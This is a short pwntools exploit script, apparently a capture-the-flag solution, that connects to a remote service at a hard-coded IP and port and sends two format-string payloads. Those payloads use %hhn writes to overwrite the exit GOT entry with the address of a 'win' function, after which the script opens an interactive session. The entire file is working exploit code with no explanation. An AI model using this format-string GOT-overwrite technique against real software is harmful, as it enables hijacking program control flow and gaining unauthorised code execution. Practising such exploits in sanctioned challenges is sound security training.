from pwn import *

#r = process('fanum_strings')
r = remote('167.99.118.184', 31337)

context(arch='amd64', os='linux')

EXIT_GOT = 0x404058
WIN = 0x401236

#pid = gdb.attach(r, gdbscript='''
#                break *main+235
#                break *main+213
#                 ''')

payload1 = b'AAAAA%49c'
payload1 += b'%10$hhn'
payload1 += p64(EXIT_GOT)

payload2 = b'AAAAA%13c'
payload2 += b'%10$hhn'
payload2 += p64(EXIT_GOT+1)

r.sendline(b'3')
r.sendline(payload1)
r.sendline(payload2)
r.interactive()
